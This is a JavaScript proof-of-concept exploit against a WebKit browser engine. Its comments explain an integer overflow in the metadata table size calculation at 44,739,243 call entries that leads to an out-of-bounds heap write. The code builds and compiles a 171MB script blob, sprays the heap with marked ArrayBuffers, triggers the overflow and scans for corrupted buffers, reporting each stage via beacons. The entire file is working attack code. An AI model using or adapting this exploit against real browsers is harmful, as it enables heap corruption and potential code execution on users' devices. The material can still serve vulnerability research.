// p141 — MetadataTable integer overflow at N=44,739,243 op_call entries (param)
//
// THEORY (confirmed from wk1200 source, UnlinkedMetadataTable.cpp:99-164):
//   finalize(): offset=108, roundUp(8)→112, then offset += N*96 as UNSIGNED.
//   At N=44,739,243: 44,739,243*96 = 0x100000020 → wraps to 0x20 = 32.
//   Total = 112 + 32 = 144. m_is32Bit = (144 > 65535) = false → 16-bit table.
//   link(): allocates sizeof(LinkingData) + 144 bytes → SUCCEEDS (tiny).
//   memset(buf+108, 0, 144-108) = memset(36 bytes) → in-bounds.
//   finishCreation(): writes 96B per op_call starting at offset 112.
//     Entry #0: bytes 112-207 → buffer ends at 143 → 64 BYTES OOB!
//     Entry #1+: fully OOB, advancing 96B per entry → 4.29GB total.
//
// WHY ALL PRIOR CALLS CRASHED:
//   10M entries → 960MB alloc → OOM → crash.
//   30M entries → 2.88GB alloc → OOM → crash.
//   At 44.7M, alloc is ONLY 144 bytes → succeeds. The OOB sweep is the primitive.
//
// APPROACH:
//   1. Main thread builds 171MB blob (chunked) → Blob URL → <script> compile
//   2. Spray ArrayBuffer(128) × 20,000 → fill target bmalloc size class
//   3. Call function → link() 144-byte alloc → finishCreation OOB sweep
//   4. Monitor: heartbeats (2s), pre/post-call beacons, callback detection
//
// CRITICAL: The 171MB blob compiles the function but does NOT call it.
//   The call is our trigger. We control WHEN it fires.
//
// Beacon prefix: V141X-
(function(){
var rid='v141x'+Math.random().toString(36).slice(2,12);
var T0=Date.now();
var hbN=0;
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V141X-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
}
setInterval(function(){hbN++;beacon('HB',{n:hbN,ms:Date.now()-T0});},2000);
beacon('L','p141-overflow N=44739243');

var N_TARGET=44739243;
var CHUNK=4000000;
var CHUNKS=Math.floor(N_TARGET/CHUNK);
var REM=N_TARGET-CHUNKS*CHUNK;

// ======== Phase 1: Build Blob ========
function buildBlob(){
  var t0=Date.now();
  try{
    var parts=[];
    parts.push('window.__v141fn=function(a){');

    for(var c=0;c<CHUNKS;c++){
      parts.push('a();'.repeat(CHUNK));
      if(c%3===0) beacon('BLD',{c:c,of:CHUNKS,ms:Date.now()-t0});
    }
    if(REM>0) parts.push('a();'.repeat(REM));
    parts.push('};window.__v141ok=true;');

    var blobMs=Date.now()-t0;
    beacon('PARTS',{n:parts.length,ms:blobMs});

    var blob=new Blob(parts,{type:'application/javascript'});
    parts=null;
    beacon('BLOB',{size:blob.size,ms:Date.now()-t0});
    return blob;
  }catch(e){
    beacon('BLOB-ERR',{e:e.constructor.name+':'+String(e.message||'').slice(0,80),ms:Date.now()-t0});
    return null;
  }
}

// ======== Phase 2: Load via <script> ========
function loadBlob(blob,cb){
  var url=URL.createObjectURL(blob);
  var sc=document.createElement('script');
  sc.src=url;
  var t0=Date.now();

  sc.onload=function(){
    var ms=Date.now()-t0;
    var ok=!!window.__v141ok;
    var hasFn=typeof window.__v141fn==='function';
    beacon('LOADED',{ms:ms,ok:ok,hasFn:hasFn});
    URL.revokeObjectURL(url);
    blob=null;
    if(hasFn) cb(null,ms);
    else cb('no-fn',ms);
  };
  sc.onerror=function(){
    beacon('LOAD-ERR',{ms:Date.now()-t0});
    URL.revokeObjectURL(url);
    cb('load-error',Date.now()-t0);
  };
  document.head.appendChild(sc);

  setTimeout(function(){
    beacon('LOAD-CHK-60',{ok:!!window.__v141ok,hasFn:typeof window.__v141fn==='function'});
  },60000);
  setTimeout(function(){
    beacon('LOAD-CHK-120',{ok:!!window.__v141ok,hasFn:typeof window.__v141fn==='function'});
  },120000);
  setTimeout(function(){
    beacon('LOAD-CHK-300',{ok:!!window.__v141ok,hasFn:typeof window.__v141fn==='function'});
  },300000);
}

// ======== Phase 3: Heap Spray ========
function sprayHeap(){
  var t0=Date.now();
  var bufs=[];
  var SPRAY_COUNT=20000;
  var SPRAY_SIZE=128;
  var MARKER=0xDEAD0141;
  try{
    for(var i=0;i<SPRAY_COUNT;i++){
      var ab=new ArrayBuffer(SPRAY_SIZE);
      var dv=new DataView(ab);
      dv.setUint32(0,MARKER,true);
      dv.setUint32(4,i,true);
      dv.setUint32(8,SPRAY_SIZE,true);
      bufs.push({ab:ab,dv:dv,idx:i});
    }
    window.__v141spray=bufs;
    beacon('SPRAY',{count:bufs.length,size:SPRAY_SIZE,ms:Date.now()-t0,totalMB:Math.round(SPRAY_COUNT*SPRAY_SIZE/1048576)});
    return bufs;
  }catch(e){
    window.__v141spray=bufs;
    beacon('SPRAY-ERR',{count:bufs.length,e:e.constructor.name+':'+String(e.message||'').slice(0,60),ms:Date.now()-t0});
    return bufs;
  }
}

// ======== Phase 4: Call (the trigger) ========
function triggerCall(bufs){
  var t0=Date.now();
  beacon('PRE-CALL',{n:N_TARGET,hb:hbN,spray:bufs.length});

  var callCount=0;
  var bodyReached=false;
  var cbErr=null;
  try{
    beacon('CALLING','now');
    window.__v141fn(function(){
      callCount++;
      if(callCount===1) beacon('CB1',{ms:Date.now()-t0});
      if(callCount>=3) throw new Error('PSTOP141');
    });
    beacon('RET',{cc:callCount,ms:Date.now()-t0});
  }catch(e){
    if(e&&e.message==='PSTOP141'){
      beacon('STOP',{cc:callCount,ms:Date.now()-t0});
    }else{
      cbErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
      beacon('CALL-ERR',{e:cbErr,cc:callCount,ms:Date.now()-t0});
    }
  }

  // Phase 5: Scan spray for corruption
  scanSpray(bufs,callCount,cbErr,Date.now()-t0);
}

// ======== Phase 5: Scan spray for corruption ========
function scanSpray(bufs,callCount,cbErr,callMs){
  var t0=Date.now();
  var corrupted=[];
  var MARKER=0xDEAD0141;
  try{
    for(var i=0;i<bufs.length;i++){
      var b=bufs[i];
      try{
        if(b.ab.byteLength!==128){
          corrupted.push({i:i,type:'len',was:b.ab.byteLength});
          if(corrupted.length>=20) break;
          continue;
        }
        var m=b.dv.getUint32(0,true);
        var idx=b.dv.getUint32(4,true);
        var sz=b.dv.getUint32(8,true);
        if(m!==MARKER||idx!==i||sz!==128){
          corrupted.push({i:i,type:'data',m:m.toString(16),idx:idx,sz:sz});
          if(corrupted.length>=20) break;
        }
      }catch(e2){
        corrupted.push({i:i,type:'access-err',e:String(e2.message||'').slice(0,40)});
        if(corrupted.length>=20) break;
      }
    }
  }catch(e){
    beacon('SCAN-ERR',{e:e.constructor.name+':'+String(e.message||'').slice(0,60)});
  }

  beacon('SCAN',{
    total:bufs.length,
    corrupted:corrupted.length,
    first3:corrupted.slice(0,3),
    cc:callCount,
    cbErr:cbErr,
    callMs:callMs,
    scanMs:Date.now()-t0
  });

  if(corrupted.length>0){
    beacon('CORRUPT-DETAIL',corrupted.slice(0,10));
    beacon('WIN',{n:corrupted.length,cc:callCount});
  }else{
    beacon('NO-CORRUPT',{scanned:bufs.length,cc:callCount,callMs:callMs});
  }
}

// ======== Run ========
beacon('START','building blob N='+N_TARGET);

var blob=buildBlob();
if(!blob){
  beacon('ABORT','blob-failed');
}else{
  loadBlob(blob,function(err,loadMs){
    if(err){
      beacon('ABORT',{err:err,loadMs:loadMs});
      return;
    }
    beacon('COMPILED',{loadMs:loadMs,hb:hbN});

    // GC pause before spray
    for(var g=0;g<30;g++){var tmp=new ArrayBuffer(4194304);tmp=null;}

    setTimeout(function(){
      var bufs=sprayHeap();

      // Another GC pause, then trigger
      setTimeout(function(){
        triggerCall(bufs);

        // Final status after 30s
        setTimeout(function(){
          beacon('FINAL',{ms:Date.now()-T0,hb:hbN,ok:!!window.__v141ok});
        },30000);
      },2000);
    },3000);
  });
}
})();
